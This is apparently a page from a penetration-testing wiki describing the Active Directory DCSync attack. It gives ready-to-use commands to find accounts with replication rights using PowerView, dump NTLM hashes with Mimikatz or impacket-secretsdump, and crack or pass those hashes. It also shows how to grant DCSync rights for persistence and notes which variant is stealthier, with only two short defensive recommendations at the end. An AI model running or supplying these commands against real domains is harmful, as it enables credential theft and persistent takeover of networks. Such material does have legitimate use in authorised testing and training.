---
layout: default
title: DCSync Attack
parent: Active Directory
nav_order: 4
permalink: /ad/dcsync/
---

# DCSync Attack
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Prerequisites

- Domain account with *Replicating Directory Changes*, *Replicating Directory Changes All*, and Re*plicating Directory Changes in Filtered Set* rights. By default, members of the *Domain Admins*, *Enterprise Admins*, and *Administrators* groups have these rights assigned.

## Vulnerability

A user who has domain permissions listed above can act like a Domain Controller and ask another Domain Controller to replicate Active Directory objects. It will use MS-DRSR protocol which can not be disabled. Therefore, if you manage to compromise such an account, you'll be able to retrieve NTLM hash of any domain account.

## Exploit

If you already compromised an initial low privileged account, you can enumerate domain users which can perform DCSync attacks by using [BloodHound](https://github.com/BloodHoundAD/BloodHound) or [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

```bash
# With PowerView from a domain joined computer.
Get-ObjectAcl -DistinguishedName "dc=$company,dc=$com" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

To obtain the NTLM hash of a single targeted user using a DCSync attack, use [Mimikatz](https://github.com/gentilkiwi/mimikatz) or [impacket-secretsdump](https://github.com/fortra/impacket).

```bash
# From a domain joined Windows computer, with Mimikatz.
lsadump::dcsync /user:$domain\$target

# From Kali.
impacket-secretsdump -just-dc-user $target $domain/$username:$password@$dc_ip
```

{: .warning }
> You can also dump the entire NTDS.dit, but it's less stealthy.

Once you get the NTLM hash of your target user, you can:
* Crack it using `hashcat -m 1000`.
* Perform Pass-the-Hash.

## Persistence

If you are Domain Administrator, you can grant any domain user DCSync rights.

```bash
# From a domain joined computer with PowerView.
Add-ObjectAcl -TargetDistinguishedName "dc=$company,dc=$com" -PrincipalSamAccountName $username -Rights DCSync -Verbose
```

## Recommendations

- [ ] Disable *Replicating Directory Changes*, *Replicating Directory Changes All*, and *Replicating Directory Changes in Filtered Set* rights for domain users who don't need them.
- [ ] Enforce EDR on Domain Controllers to detect and block DCSync attacks.